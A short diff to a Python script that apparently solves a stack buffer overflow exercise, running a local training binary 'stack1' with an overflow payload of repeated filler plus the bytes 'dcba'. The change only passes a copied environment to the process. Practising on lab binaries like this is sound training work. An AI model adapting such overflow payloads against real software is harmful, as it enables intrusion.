@@ -9,6 +9,7 @@ BINARY_NAME = "stack1"
 
 def main():
     # LOCAL VARIABLES
+    currEnv = os.environ.copy()
     absBinFilename = os.path.join(os.getcwd(), BINARY_NAME)
     payload = ("HarkRulz" * 8) + "dcba"
     commandList = []
@@ -20,7 +21,7 @@ def main():
     # RUN IT
     commandList.append(absBinFilename)
     commandList.append(payload)
-    binary = Popen(commandList, stdin = PIPE)
+    binary = Popen(commandList, env = currEnv, stdin = PIPE)
     if binary is not None:
         binary.communicate()
 
